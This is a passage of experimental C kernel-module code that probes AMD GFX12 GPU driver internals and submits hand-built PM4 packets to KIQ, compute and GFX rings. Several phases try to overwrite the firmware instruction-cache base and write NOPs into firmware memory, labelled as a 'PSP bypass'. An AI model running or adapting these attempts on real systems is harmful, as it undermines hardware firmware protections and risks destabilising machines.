									pr_info("fw36: KIQ me/pipe/queue candidate at +0x%X: %u/%u/%u\n",
										k, sv, nv, mv);
								}
							}

							/* doorbell_index: typically a value like 0x80-0x200,
							 * stored as u32 near me/pipe/queue */
							for (k = gpu_off + 80; k < gpu_off + 256; k += 4) {
								u32 dv = *(u32 *)(kr + k);
								if (dv >= 0x40 && dv <= 0x400 &&
								    (dv & 1) == 0) {
									pr_info("fw36: KIQ doorbell candidate at +0x%X: 0x%X\n",
										k, dv);
								}
							}

							/* === PHASE 4: Manual PM4 ring submission ===
							 *
							 * Now that we know the ring struct layout, try
							 * writing a PM4 WRITE_DATA (type 3, op 0x32)
							 * with dst_sel=5 (memory) to write a canary
							 * to a known GART/VRAM address.
							 *
							 * But first, use amdgpu_ring_alloc() which is
							 * the safe way to allocate ring space. */
							{
								typedef int (*fn_ring_alloc)(void *ring, unsigned ndw);
								typedef void (*fn_ring_commit)(void *ring);
								fn_ring_alloc p_alloc = (fn_ring_alloc)klookup("amdgpu_ring_alloc");
								fn_ring_commit p_commit = (fn_ring_commit)klookup("amdgpu_ring_commit");

								pr_info("fw36: ring_alloc=%p ring_commit=%p\n",
									(void *)p_alloc, (void *)p_commit);

								if (p_alloc && p_commit) {
									void *ring_struct = kr;
									int ret;

									pr_info("fw36: === ATTEMPTING KIQ RING ALLOC ===\n");

									/* First: canary write to GP scratch reg via KIQ
									 * PM4 WRITE_DATA (dst_sel=0 = register) */
									ret = p_alloc(ring_struct, 16);
									if (ret) {
										pr_info("fw36: ring_alloc FAILED: %d\n", ret);
									} else {
										/* Hardcoded: ring->ring at kr+0x70 */
										u32 *ring_buf = *(u32 **)(kr + 0x70);
											pr_info("fw36: ring_alloc SUCCESS\n");

										/* Read current wptr to know where to write */
										/* wptr is at a known offset from buf — find it */
										/* For now, use amdgpu_ring_write inline logic:
										 * ring->ring[ring->wptr++ & ring->buf_mask] = v
										 *
										 * We need wptr and buf_mask offsets within ring struct.
										 * From gpu_off+8 = ring_size, gpu_off+12 = buf_mask.
										 * wptr should be at a fixed offset.
										 * Let's try reading from the identified candidate. */

										/* Use ring_alloc return to confirm, then manually
										 * write PM4 words and ring_commit */

										/* PM4 WRITE_DATA to GP scratch 0x2960:
										 * Header: (3<<30) | (0x32<<8) | (count-2)
										 * DW1: dst_sel=0, wr_confirm=1
										 * DW2: reg addr (0x2960)
										 * DW3: data
										 * Total: 4 DW, count=4, header count field=2 */
										{
											/* Find wptr in the struct */
											u64 *wptr_ptr = NULL;
											u32 bm_val = *(u32 *)(kr + 0x68); /* hardcoded buf_mask offset */
											u64 wptr_now;

											/* Hardcoded: wptr at kr+0x1C8 (confirmed from kiq_map_queues disasm) */
											wptr_ptr = (u64 *)(kr + 0x1C8);
											pr_info("fw36: Using hardcoded wptr at ring+0x1C8 = %llu\n", *wptr_ptr);

											if (wptr_ptr && bm_val > 0) {
												u32 gp_before = rr(0x2960);

												wptr_now = *wptr_ptr;
												pr_info("fw36: wptr=%llu buf_mask=0x%X GP_before=0x%X\n",
													wptr_now, bm_val, gp_before);

												/* Write PM4 packet: WRITE_DATA to reg 0x2960 */
												ring_buf[wptr_now & bm_val] =
													(3 << 30) | (0x32 << 8) | 2;
												*wptr_ptr = wptr_now + 1;

												ring_buf[*wptr_ptr & bm_val] =
													(1 << 20) | (0 << 8); /* wr_confirm=1, dst_sel=0 (reg) */
												*wptr_ptr = *wptr_ptr + 1;

												ring_buf[*wptr_ptr & bm_val] = 0x2960;
												*wptr_ptr = *wptr_ptr + 1;

												ring_buf[*wptr_ptr & bm_val] = 0xCAFE0035;
												*wptr_ptr = *wptr_ptr + 1;

												pr_info("fw36: PM4 written: WRITE_DATA reg=0x2960 val=0xCAFE0035, wptr now=%llu\n",
													*wptr_ptr);

												/* Commit via ring_commit */
												p_commit(ring_struct);
												udelay(500);

												{
													u32 gp_after = rr(0x2960);
													pr_info("fw36: GP after: 0x%X %s\n",
														gp_after,
														gp_after == 0xCAFE0035 ?
														"*** PM4 RING SUBMIT WORKS ***" :
														(gp_after != gp_before ?
														"CHANGED (partial?)" :
														"UNCHANGED"));

													if (gp_after == 0xCAFE0035) {
														/* Ring submission confirmed!
														 * Now try WRITE_DATA with dst_sel=5 (memory)
														 * to write to a GART address.
														 *
														 * We can use the KIQ EOP address as a safe
														 * GART target. From the kiq struct, eop_gpu_addr
														 * should be nearby. */
														pr_info("fw36: *** KIQ RING SUBMISSION CONFIRMED ***\n");
														pr_info("fw36: Next: try dst_sel=5 (memory write)\n");

														/* Try writing IC_BASE via dst_sel=0
														 * One more shot at PSP bypass through
														 * the actual ring path */
														ret = p_alloc(ring_struct, 16);
														if (!ret) {
															u32 ic_before = rr(regCP_CPC_IC_BASE_LO);

															wptr_now = *wptr_ptr;

															/* WRITE_DATA to IC_BASE_LO */
															ring_buf[wptr_now & bm_val] =
																(3 << 30) | (0x32 << 8) | 2;
															*wptr_ptr = wptr_now + 1;

															ring_buf[*wptr_ptr & bm_val] =
																(1 << 20) | (0 << 8);
															*wptr_ptr = *wptr_ptr + 1;

															ring_buf[*wptr_ptr & bm_val] = regCP_CPC_IC_BASE_LO;
															*wptr_ptr = *wptr_ptr + 1;

															ring_buf[*wptr_ptr & bm_val] = ic_before ^ 0x1000;
															*wptr_ptr = *wptr_ptr + 1;

															p_commit(ring_struct);
															udelay(500);

															{
																u32 ic_after = rr(regCP_CPC_IC_BASE_LO);
																pr_info("fw36: IC_BASE_LO: before=0x%X after=0x%X %s\n",
																	ic_before, ic_after,
																	ic_after != ic_before ?
																	"*** PSP BYPASS VIA KIQ RING ***" :
																	"PSP still locked");

																if (ic_after != ic_before) {
																	/* RESTORE! */
																	ret = p_alloc(ring_struct, 16);
																	if (!ret) {
																		wptr_now = *wptr_ptr;
																		ring_buf[wptr_now & bm_val] =
																			(3 << 30) | (0x32 << 8) | 2;
																		*wptr_ptr = wptr_now + 1;
																		ring_buf[*wptr_ptr & bm_val] =
																			(1 << 20) | (0 << 8);
																		*wptr_ptr = *wptr_ptr + 1;
																		ring_buf[*wptr_ptr & bm_val] = regCP_CPC_IC_BASE_LO;
																		*wptr_ptr = *wptr_ptr + 1;
																		ring_buf[*wptr_ptr & bm_val] = ic_before;
																		*wptr_ptr = *wptr_ptr + 1;
																		p_commit(ring_struct);
																		udelay(200);
																		pr_info("fw36: IC_BASE_LO restored\n");
																	}
																}
															}
														}

														/* Try WRITE_DATA with dst_sel=5 (memory)
														 * to IC_BASE physical address.
														 * IC_BASE = 0x20681D4000 (GPU virtual).
														 * Write our NOP sled there. */
														ret = p_alloc(ring_struct, 16);
														if (!ret) {
															u64 ic_addr = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) |
																      rr(regCP_CPC_IC_BASE_LO);
															u32 orig_word;

															pr_info("fw36: Attempting WRITE_DATA dst_sel=5 to IC_BASE=0x%llX\n",
																ic_addr);

															/* First: READ from IC_BASE via
															 * COPY_DATA (op 0x40) to verify
															 * we can access that GPU VA.
															 *
															 * COPY_DATA:
															 * DW0: header
															 * DW1: src_sel=1(mem), dst_sel=0(reg), count_sel=0
															 * DW2: src_addr_lo
															 * DW3: src_addr_hi
															 * DW4: dst_reg (GP scratch)
															 *
															 * Actually for simplicity, try direct
															 * memory write first. */

															wptr_now = *wptr_ptr;

															/* WRITE_DATA to GPU memory at IC_BASE:
															 * Header: (3<<30)|(0x32<<8)|4 (6 DW total - 2)
															 * DW1: engine=0, dst_sel=5(mem-async), wr_confirm=1
															 * DW2: addr_lo
															 * DW3: addr_hi
															 * DW4: data (NOP=0x00000000) */
															ring_buf[wptr_now & bm_val] =
																(3 << 30) | (0x32 << 8) | 4;
															*wptr_ptr = wptr_now + 1;

															ring_buf[*wptr_ptr & bm_val] =
																(1 << 20) | (5 << 8); /* wr_confirm=1, dst_sel=5 */
															*wptr_ptr = *wptr_ptr + 1;

															ring_buf[*wptr_ptr & bm_val] = (u32)(ic_addr);
															*wptr_ptr = *wptr_ptr + 1;

															ring_buf[*wptr_ptr & bm_val] = (u32)(ic_addr >> 32);
															*wptr_ptr = *wptr_ptr + 1;

															/* Write 2 NOP instructions */
															ring_buf[*wptr_ptr & bm_val] = 0xBF800000; /* s_nop 0 */
															*wptr_ptr = *wptr_ptr + 1;

															ring_buf[*wptr_ptr & bm_val] = 0xBF800000; /* s_nop 0 */
															*wptr_ptr = *wptr_ptr + 1;

															p_commit(ring_struct);
															udelay(1000);

															/* Check MEC PC — if we wrote NOPs,
															 * MEC should keep running */
															{
																u32 pc_now = rr(regCP_MEC1_INSTR_PNTR);
																pr_info("fw36: MEC PC after mem write: 0x%04X (was 0x%04X)\n",
																	pc_now, pc_orig);
																pr_info("fw36: (PC change would indicate firmware modification)\n");
															}
														}
													}
												}
											} else {
												pr_info("fw36: Could not find wptr/buf_mask\n");
											}
										}

										/* If we couldn't do manual wptr, try
										 * amdgpu_kiq_wreg as canary test */
										if (1) {
											typedef void (*fn_kiq_wreg)(void *adev, u32 reg, u32 val);
											typedef u32 (*fn_kiq_rreg)(void *adev, u32 reg);
											fn_kiq_wreg kiq_wreg = (fn_kiq_wreg)klookup("amdgpu_kiq_wreg");
											fn_kiq_rreg kiq_rreg = (fn_kiq_rreg)klookup("amdgpu_kiq_rreg");

											if (kiq_wreg && kiq_rreg) {
												u32 before = rr(0x2960);
												kiq_wreg(adev, 0x2960, 0xCAFE0020);
												udelay(200);
												{
													u32 after = rr(0x2960);
													pr_info("fw36: KIQ wreg canary: before=0x%X after=0x%X %s\n",
														before, after,
														after == 0xCAFE0020 ?
														"KIQ WORKS" : "KIQ BROKEN");
												}
											}
										}
									}
								}
							}
						}
					}
				} else {
					pr_info("fw36: KIQ ring struct NOT FOUND\n");
				}

				/* === Disassemble gfx_v12_0_kiq_map_queues === */
				{
					unsigned long map_fn = klookup("gfx_v12_0_kiq_map_queues");
					if (map_fn) {
						u8 *mcode = (u8 *)map_fn;
						int mi;
						pr_info("fw36: gfx_v12_0_kiq_map_queues @ 0x%lX:\n", map_fn);
						for (mi = 0; mi < 192; mi += 16) {
							pr_info("fw36:   +%03X: %02X%02X%02X%02X "
								"%02X%02X%02X%02X "
								"%02X%02X%02X%02X "
								"%02X%02X%02X%02X\n",
								mi,
								mcode[mi+0], mcode[mi+1],
								mcode[mi+2], mcode[mi+3],
								mcode[mi+4], mcode[mi+5],
								mcode[mi+6], mcode[mi+7],
								mcode[mi+8], mcode[mi+9],
								mcode[mi+10], mcode[mi+11],
								mcode[mi+12], mcode[mi+13],
								mcode[mi+14], mcode[mi+15]);
						}
					} else {
						pr_info("fw36: gfx_v12_0_kiq_map_queues not found\n");
					}
				}
			}
		}
	}

	/* === PHASE 5: Try COMPUTE ring + direct doorbell ===
	 *
	 * KIQ ring is dead (MES not servicing it). Try:
	 * A) Compute ring at adev+0x19598 (has initialized buf)
	 * B) Direct doorbell write to wake GPU
	 * C) amdgpu_ring_test_ring() to verify ring health
	 * D) Submit through IB (indirect buffer) path */
	{
		int kiq_ring_off = 0x16DC0; /* hardcoded from prior discovery */
		typedef int (*fn_ring_test)(void *ring, long timeout);
		typedef int (*fn_ring_alloc)(void *ring, unsigned ndw);
		typedef void (*fn_ring_commit)(void *ring);
		typedef void (*fn_ring_set_wptr)(void *ring);
		fn_ring_test p_test = (fn_ring_test)klookup("amdgpu_ring_test_ring");
		fn_ring_alloc p_alloc = (fn_ring_alloc)klookup("amdgpu_ring_alloc");
		fn_ring_commit p_commit = (fn_ring_commit)klookup("amdgpu_ring_commit");
		fn_ring_set_wptr p_set_wptr = (fn_ring_set_wptr)klookup("amdgpu_ring_set_wptr");

		pr_info("fw36: === PHASE 5: COMPUTE RING + DOORBELL ===\n");
		pr_info("fw36: ring_test=%p set_wptr=%p\n",
			(void *)p_test, (void *)p_set_wptr);

		/* 5A: Try ring_test on KIQ to confirm it's dead */
		if (p_test && kiq_ring_off >= 0) {
			u8 *kr = (u8 *)adev + kiq_ring_off;
			int ret;
			pr_info("fw36: Testing KIQ ring (mes_kiq)...\n");
			ret = p_test(kr, 1000); /* 1 second timeout */
			pr_info("fw36: KIQ ring_test: %d (%s)\n",
				ret, ret ? "DEAD" : "ALIVE");
		}

		/* 5B: Scan for active compute rings and test them */
		{
			int comp_offsets[] = {0x18F68, 0x19280, 0x19598, 0x198B0,
			                     0x19BC8, 0x19EE0, 0x1A1F8, 0x1A510};
			int ci;
			for (ci = 0; ci < 8; ci++) {
				u8 *cr = (u8 *)adev + comp_offsets[ci];
				u64 cr_adev = *(u64 *)(cr + 0x00);
				u64 cr_buf  = *(u64 *)(cr + 0x70);
				u32 cr_mask = *(u32 *)(cr + 0x68);
				u64 cr_wptr = *(u64 *)(cr + 0x1C8);

				if (cr_adev != (u64)adev) continue;
				if (!cr_buf) continue;

				pr_info("fw36: COMPUTE[%d] at adev+0x%X: buf=%p mask=0x%X wptr=%llu\n",
					ci, comp_offsets[ci], (void *)cr_buf,
					cr_mask, cr_wptr);

				/* Read ring name at +0x280 */
				{
					char rname[32];
					memcpy(rname, cr + 0x280, 24);
					rname[24] = 0;
					pr_info("fw36:   name: %.24s\n", rname);
				}

				/* Test this ring */
				if (p_test) {
					int ret = p_test(cr, 1000);
					pr_info("fw36:   ring_test: %d (%s)\n",
						ret, ret ? "DEAD" : "ALIVE");

					if (ret == 0 && p_alloc && p_commit) {
						/* This ring is ALIVE! Try PM4 on it */
						u32 *rbuf = (u32 *)cr_buf;
						u32 bm = cr_mask;
						u64 *wp = (u64 *)(cr + 0x1C8);
						u32 gp_before;

						pr_info("fw36: *** LIVE COMPUTE RING FOUND! ***\n");

						ret = p_alloc(cr, 16);
						if (!ret) {
							u64 w = *wp;
							gp_before = rr(0x2960);

							/* PM4 WRITE_DATA to GP scratch */
							rbuf[w & bm] = (3 << 30) | (0x32 << 8) | 2;
							*wp = w + 1;
							rbuf[*wp & bm] = (1 << 20) | (0 << 8);
							*wp = *wp + 1;
							rbuf[*wp & bm] = 0x2960;
							*wp = *wp + 1;
							rbuf[*wp & bm] = 0xCAFE0C00 | ci;
							*wp = *wp + 1;

							p_commit(cr);
							udelay(1000);

							{
								u32 gp_after = rr(0x2960);
								pr_info("fw36:   GP: 0x%X -> 0x%X %s\n",
									gp_before, gp_after,
									(gp_after == (0xCAFE0C00 | ci)) ?
									"*** COMPUTE PM4 WORKS ***" :
									(gp_after != gp_before ?
									"CHANGED" : "UNCHANGED"));

								if (gp_after == (0xCAFE0C00 | ci)) {
									/* COMPUTE RING PM4 CONFIRMED!
									 * Now try writing IC_BASE */
									pr_info("fw36: === TRYING IC_BASE VIA COMPUTE RING ===\n");

									ret = p_alloc(cr, 16);
									if (!ret) {
										u32 ic_before = rr(regCP_CPC_IC_BASE_LO);
										w = *wp;

										rbuf[w & bm] = (3 << 30) | (0x32 << 8) | 2;
										*wp = w + 1;
										rbuf[*wp & bm] = (1 << 20) | (0 << 8);
										*wp = *wp + 1;
										rbuf[*wp & bm] = regCP_CPC_IC_BASE_LO;
										*wp = *wp + 1;
										rbuf[*wp & bm] = ic_before ^ 0x1000;
										*wp = *wp + 1;

										p_commit(cr);
										udelay(1000);

										{
											u32 ic_after = rr(regCP_CPC_IC_BASE_LO);
											pr_info("fw36:   IC_BASE: 0x%X -> 0x%X %s\n",
												ic_before, ic_after,
												ic_after != ic_before ?
												"*** PSP BYPASS VIA COMPUTE ***" :
												"PSP locked");
											/* Restore if changed */
											if (ic_after != ic_before) {
												ret = p_alloc(cr, 16);
												if (!ret) {
													w = *wp;
													rbuf[w & bm] = (3 << 30) | (0x32 << 8) | 2;
													*wp = w + 1;
													rbuf[*wp & bm] = (1 << 20) | (0 << 8);
													*wp = *wp + 1;
													rbuf[*wp & bm] = regCP_CPC_IC_BASE_LO;
													*wp = *wp + 1;
													rbuf[*wp & bm] = ic_before;
													*wp = *wp + 1;
													p_commit(cr);
													udelay(200);
												}
											}
										}
									}

									/* Try WRITE_DATA dst_sel=5 (memory)
									 * to IC_BASE GPU VA */
									ret = p_alloc(cr, 16);
									if (!ret) {
										u64 ic_addr = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) |
											rr(regCP_CPC_IC_BASE_LO);

										pr_info("fw36: WRITE_DATA dst_sel=5 to IC_BASE=0x%llX\n", ic_addr);

										w = *wp;
										/* 6 DW: header + control + addr_lo + addr_hi + data0 + data1 */
										rbuf[w & bm] = (3 << 30) | (0x32 << 8) | 4;
										*wp = w + 1;
										rbuf[*wp & bm] = (1 << 20) | (5 << 8); /* wr_confirm=1, dst_sel=5(mem) */
										*wp = *wp + 1;
										rbuf[*wp & bm] = (u32)(ic_addr);
										*wp = *wp + 1;
										rbuf[*wp & bm] = (u32)(ic_addr >> 32);
										*wp = *wp + 1;
										rbuf[*wp & bm] = 0xBF800000; /* s_nop 0 */
										*wp = *wp + 1;
										rbuf[*wp & bm] = 0xBF800000; /* s_nop 0 */
										*wp = *wp + 1;

										p_commit(cr);
										udelay(2000);

										{
											u32 pc_now = rr(regCP_MEC1_INSTR_PNTR);
											pr_info("fw36: MEC PC after mem write: 0x%04X\n", pc_now);
										}
									}
								}
							}
						} else {
							pr_info("fw36:   ring_alloc failed: %d\n", ret);
						}

						break; /* Only use first live ring */
					}
				}
			}
		}

		/* 5C: Also try GFX ring at adev+0x18930 */
		{
			u8 *gr = (u8 *)adev + 0x18930;
			u64 gr_adev = *(u64 *)(gr + 0x00);
			u64 gr_buf  = *(u64 *)(gr + 0x70);
			u32 gr_mask = *(u32 *)(gr + 0x68);
			u64 gr_wptr = *(u64 *)(gr + 0x1C8);
			char gname[32];
			memcpy(gname, gr + 0x280, 24);
			gname[24] = 0;

			pr_info("fw36: GFX ring at adev+0x18930: buf=%p mask=0x%X wptr=%llu name=%.24s\n",
				(void *)gr_buf, gr_mask, gr_wptr, gname);

			if (gr_adev == (u64)adev && gr_buf && p_test) {
				int ret = p_test(gr, 1000);
				pr_info("fw36: GFX ring_test: %d (%s)\n",
					ret, ret ? "DEAD" : "ALIVE");
			}
		}

		/* 5D: Check doorbell info for KIQ ring */
		if (kiq_ring_off >= 0) {
			u8 *kr = (u8 *)adev + kiq_ring_off;
			/* Doorbell fields in ring struct */
			u32 db_idx = *(u32 *)(kr + 0x2E8);
			u64 db_wptr_ptr = *(u64 *)(kr + 0x1C0);
			pr_info("fw36: KIQ doorbell_index=0x%X wptr_gpu_addr=0x%llX\n",
				db_idx, db_wptr_ptr);

			/* Check if there's a use_doorbell flag */
			{
				u32 use_db = *(u32 *)(kr + 0x2E0);
				pr_info("fw36: KIQ use_doorbell area: +0x2E0=0x%X +0x2E4=0x%X\n",
					use_db, *(u32 *)(kr + 0x2E4));
			}

			/* Try manually writing wptr to doorbell if we can find it */
			if (p_set_wptr) {
				pr_info("fw36: Calling amdgpu_ring_set_wptr on KIQ...\n");
				p_set_wptr(kr);
				udelay(500);
				pr_info("fw36: set_wptr done\n");
			}
		}
	}

	/* === PHASE 6: Direct emit_wreg + set_wptr on KIQ ===
	 *
	 * Call gfx_v12_0_ring_emit_wreg directly (handles PM4 format)
	 * then ring->funcs->set_wptr() via vtable to ring doorbell.
	 *
	 * Also try: amdgpu_job_submit_direct for proper job path. */
	{
		int kiq_off = 0x16DC0;
		u8 *kr = (u8 *)adev + kiq_off;
		u64 funcs_ptr = *(u64 *)(kr + 0x08);
		typedef int (*fn_alloc6)(void *ring, unsigned ndw);
		typedef void (*fn_commit6)(void *ring);
		typedef void (*fn_emit_wreg)(void *ring, u32 reg, u32 val);
		typedef void (*fn_set_wptr)(void *ring);

		fn_alloc6 p_alloc2 = (fn_alloc6)klookup("amdgpu_ring_alloc");
		fn_commit6 p_commit2 = (fn_commit6)klookup("amdgpu_ring_commit");

		fn_emit_wreg p_emit_wreg = (fn_emit_wreg)klookup("gfx_v12_0_ring_emit_wreg");
		fn_set_wptr p_set_wptr_fn = (fn_set_wptr)(*(u64 *)((u8 *)funcs_ptr + 0x28));

		pr_info("fw36: === PHASE 6: EMIT_WREG + SET_WPTR ===\n");
		pr_info("fw36: emit_wreg=%p set_wptr_fn=%p\n",
			(void *)p_emit_wreg, (void *)p_set_wptr_fn);

		/* 6A: Try emit_wreg on KIQ ring (after ring_alloc) */
		if (p_emit_wreg && p_alloc2) {
			int ret;
			u32 gp_before = rr(0x2960);

			pr_info("fw36: ring_alloc for emit_wreg...\n");
			ret = p_alloc2(kr, 16);
			if (!ret) {
				pr_info("fw36: Calling emit_wreg(kiq, 0x2960, 0xDEAD0006)\n");
				p_emit_wreg(kr, 0x2960, 0xDEAD0006);

				/* Now commit (which should call set_wptr internally) */
				if (p_commit2) {
					p_commit2(kr);
					udelay(2000);
				}

				{
					u32 gp_after = rr(0x2960);
					pr_info("fw36: GP: 0x%X -> 0x%X %s\n",
						gp_before, gp_after,
						gp_after == 0xDEAD0006 ?
						"*** EMIT_WREG WORKS ***" :
						(gp_after != gp_before ? "CHANGED" : "UNCHANGED"));
				}
			} else {
				pr_info("fw36: ring_alloc failed: %d\n", ret);
			}
		}

		/* 6B: Try calling set_wptr directly (manual doorbell ring) */
		if (p_set_wptr_fn) {
			u64 wptr_before = *(u64 *)(kr + 0x1C8);
			pr_info("fw36: Direct set_wptr call, wptr=%llu\n", wptr_before);
			p_set_wptr_fn(kr);
			udelay(1000);
			pr_info("fw36: set_wptr done\n");
		}

		/* 6C: Dump compute ring structs to verify layout.
		 * Print raw bytes at +0x60..+0x80 for one compute ring */
		{
			u8 *cr = (u8 *)adev + 0x19598; /* comp_1.2.0 - had buf!=0 earlier */
			int ci;
			pr_info("fw36: COMPUTE ring comp_1.2.0 raw dump:\n");
			for (ci = 0; ci < 0x200; ci += 32) {
				u64 a = *(u64 *)(cr + ci);
				u64 b = *(u64 *)(cr + ci + 8);
				u64 c = *(u64 *)(cr + ci + 16);
				u64 d = *(u64 *)(cr + ci + 24);
				if (a || b || c || d) {
					pr_info("fw36:   C+0x%03X: %016llX %016llX "
						"%016llX %016llX\n",
						ci, a, b, c, d);
				}
			}
		}

		/* 6D: Try the GFX ring (gfx_0.0.0 at adev+0x18930)
		 * with emit_wreg. GFX ring might be serviced even if KIQ isn't */
		{
			u8 *gr = (u8 *)adev + 0x18930;
			u64 gr_buf = *(u64 *)(gr + 0x70);
			u32 gr_mask = *(u32 *)(gr + 0x68);

			if (gr_buf && gr_mask > 3 && p_emit_wreg && p_alloc2 && p_commit2) {
				int ret;
				u32 gp_before = rr(0x2960);

				pr_info("fw36: GFX ring buf_mask=0x%X, trying emit_wreg\n", gr_mask);
				ret = p_alloc2(gr, 16);
				if (!ret) {
					p_emit_wreg(gr, 0x2960, 0xCAFE06F0);
					p_commit2(gr);
					udelay(2000);

					{
						u32 gp_after = rr(0x2960);
						pr_info("fw36: GFX GP: 0x%X -> 0x%X %s\n",
							gp_before, gp_after,
							gp_after != gp_before ?
							"*** GFX RING WORKS ***" : "UNCHANGED");
					}
				} else {
					pr_info("fw36: GFX ring_alloc failed: %d\n", ret);
				}
			} else {
				pr_info("fw36: GFX ring not usable (buf=0x%llX mask=0x%X)\n",
					gr_buf, gr_mask);
			}
		}

		/* 6E: Try SDMA rings (separate from GFX/compute) */
		{
			/* SDMA rings are at adev->sdma.instance[i].ring
			 * Need to find the offset. Look for "sdma" named rings */
			int sd;
			pr_info("fw36: Scanning for SDMA rings...\n");
			for (sd = 0x20000; sd < 0x30000; sd += 8) {
				u64 v = *(u64 *)((u8 *)adev + sd);
				if (v == (u64)adev) {
					u64 f = *(u64 *)((u8 *)adev + sd + 8);
					if ((f >> 48) == 0xFFFF && (f & 0xFFF) == 0) {
						char rname[32];
						memcpy(rname, (u8 *)adev + sd + 0x280, 16);
						rname[16] = 0;
						if (rname[0] == 's' && rname[1] == 'd') {
							u64 sbuf = *(u64 *)((u8 *)adev + sd + 0x70);
							u32 smask = *(u32 *)((u8 *)adev + sd + 0x68);
							u64 swptr = *(u64 *)((u8 *)adev + sd + 0x1C8);
							pr_info("fw36: SDMA ring at adev+0x%X: %.16s buf=0x%llX mask=0x%X wptr=%llu\n",
								sd, rname, sbuf, smask, swptr);
						}
					}
				}
			}
		}
	}

	/* === PHASE 7: MES status + doorbell BAR + wider SDMA scan === */
	{
		pr_info("fw36: === PHASE 7: MES/DOORBELL/SDMA ===\n");

		/* 7A: MES registers — check if MES firmware is alive */
		{
			/* MES uses the same GC register space.
			 * Key regs (GFX12):
			 *   CP_MES_PRGRM_CNTR_START = GC0 + 0x1A3C
			 *   CP_MES_INSTR_PNTR = GC0 + 0x1A3D
			 *   CP_MES_CNTL = GC0 + 0x1A40
			 *   CP_MES_GP0_LO/HI (mailbox)
			 * Also MES pipe 1:
			 *   CP_MES_PRGRM_CNTR_START_1 = GC0 + 0x1A4C
			 *   CP_MES_INSTR_PNTR_1 = GC0 + 0x1A4D */
			u32 mes_pc0, mes_pc1, mes_cntl;
			u32 mes_prg0, mes_prg1;

			/* Try multiple register naming conventions */
			mes_pc0 = rr(GC0(0x1A3D));
			mes_prg0 = rr(GC0(0x1A3C));
			mes_cntl = rr(GC0(0x1A40));
			mes_pc1 = rr(GC0(0x1A4D));
			mes_prg1 = rr(GC0(0x1A4C));

			pr_info("fw36: MES pipe0: PC=0x%04X start=0x%04X cntl=0x%08X\n",
				mes_pc0, mes_prg0, mes_cntl);
			pr_info("fw36: MES pipe1: PC=0x%04X start=0x%04X\n",
				mes_pc1, mes_prg1);

			/* Also check MES mailbox regs for error status */
			{
				u32 gp0_lo = rr(GC0(0x1A3E));
				u32 gp0_hi = rr(GC0(0x1A3F));
				u32 gp1_lo = rr(GC0(0x1A44));
				u32 gp1_hi = rr(GC0(0x1A45));
				pr_info("fw36: MES GP0=0x%08X_%08X GP1=0x%08X_%08X\n",
					gp0_hi, gp0_lo, gp1_hi, gp1_lo);
			}

			/* Broader MES register dump */
			{
				int mi;
				pr_info("fw36: MES register dump (GC0+0x1A30..0x1A60):\n");
				for (mi = 0x1A30; mi < 0x1A60; mi++) {
					u32 rv = rr(GC0(mi));
					if (rv != 0 && rv != 0xFFFFFFFF) {
						pr_info("fw36:   GC0+0x%04X = 0x%08X\n", mi, rv);
					}
				}
			}
		}

		/* 7B: Doorbell BAR — find and try direct doorbell write */
		{
			/* adev->doorbell.ptr is the kernel mapping of doorbell BAR.
			 * Doorbell BAR is BAR 2 on most AMD GPUs.
			 * We can find it by scanning adev for the PCI BAR address. */
			unsigned long db_ptr = 0;
			int di;

			/* Search adev for doorbell pointer.
			 * adev->doorbell is an embedded struct with:
			 *   .ptr (u32 __iomem *)
			 *   .base (resource start)
			 *   .size
			 *   .num_kernel_doorbells
			 * We'll scan for a kernel ioremap address near BAR 2 */

			/* Get PCI BAR 2 from lspci */
			pr_info("fw36: Scanning adev for doorbell ptr...\n");

			/* The doorbell struct is usually at a fixed offset.
			 * Try scanning for a sequence: base_addr(u64), size(u64), ptr(u64)
			 * where base_addr matches BAR 2 from PCI config */
			for (di = 0x200; di < 0x1000; di += 8) {
				u64 val = *(u64 *)((u8 *)adev + di);
				/* Doorbell BAR is typically in range 0xF0000000-0xFFFFFFFF
				 * or 0x0000000X_XXXXXXXX (64-bit) */
				if (val > 0x80000000ULL && val < 0x200000000ULL &&
				    (val & 0xFFF) == 0) {
					u64 next = *(u64 *)((u8 *)adev + di + 8);
					/* Size should be small (4KB-64KB typically) */
					if (next > 0 && next <= 0x100000) {
						u64 ptr = *(u64 *)((u8 *)adev + di + 16);
						if ((ptr >> 48) == 0xFFFF || (ptr >> 48) == 0xFFFE) {
							pr_info("fw36:   Doorbell candidate at adev+0x%X: "
								"base=0x%llX size=0x%llX ptr=0x%llX\n",
								di, val, next, ptr);
							if (!db_ptr) db_ptr = ptr;
						}
					}
				}
			}

			if (db_ptr) {
				/* Try writing KIQ wptr to doorbell.
				 * KIQ doorbell_index = 0x100 (from ring struct).
				 * Each doorbell is 4 bytes (u32).
				 * Doorbell offset = doorbell_index * 4 */
				u32 __iomem *db = (u32 __iomem *)db_ptr;
				u64 kiq_wptr = *(u64 *)((u8 *)adev + 0x16DC0 + 0x1C8);
				u32 db_val;

				pr_info("fw36: Doorbell ptr=0x%llX, KIQ wptr=%llu\n",
					(u64)db_ptr, kiq_wptr);

				/* Read current doorbell value */
				db_val = readl(db + 0x100);
				pr_info("fw36: Doorbell[0x100] current=0x%X\n", db_val);

				/* Write KIQ wptr to doorbell */
				writel((u32)kiq_wptr, db + 0x100);
				/* Some GPUs need 64-bit doorbell write */
				writel((u32)(kiq_wptr >> 32), db + 0x101);
				udelay(2000);

				{
					u32 gp_check = rr(0x2960);
					pr_info("fw36: After doorbell poke: GP=0x%X %s\n",
						gp_check,
						gp_check != 0 ? "*** DOORBELL WORKED ***" : "still 0");
				}
			} else {
				pr_info("fw36: Doorbell ptr not found by scan\n");
			}
		}

		/* 7C: Wider SDMA scan (0x0..0x80000) */
		{
			int sd, found = 0;
			pr_info("fw36: Wide scan for SDMA rings (0x1000..0x80000)...\n");
			for (sd = 0x1000; sd < 0x80000 && found < 5; sd += 8) {
				u64 v = *(u64 *)((u8 *)adev + sd);
				if (v == (u64)adev) {
					u64 f = *(u64 *)((u8 *)adev + sd + 8);
					if ((f >> 48) == 0xFFFF && (f & 0xFFF) == 0) {
						char rn[32];
						if (copy_from_kernel_nofault(rn, (u8 *)adev + sd + 0x280, 8) == 0) {
							rn[8] = 0;
							if (rn[0] == 's' && rn[1] == 'd') {
								u64 sb = *(u64 *)((u8 *)adev + sd + 0x70);
								pr_info("fw36: SDMA at adev+0x%X: %.8s buf=0x%llX\n",
									sd, rn, sb);
								found++;
							}
						}
					}
				}
			}
			if (!found)
				pr_info("fw36: No SDMA rings found in full scan\n");
		}

		/* 7D: List ALL ring names found anywhere in adev */
		{
			int sd, found = 0;
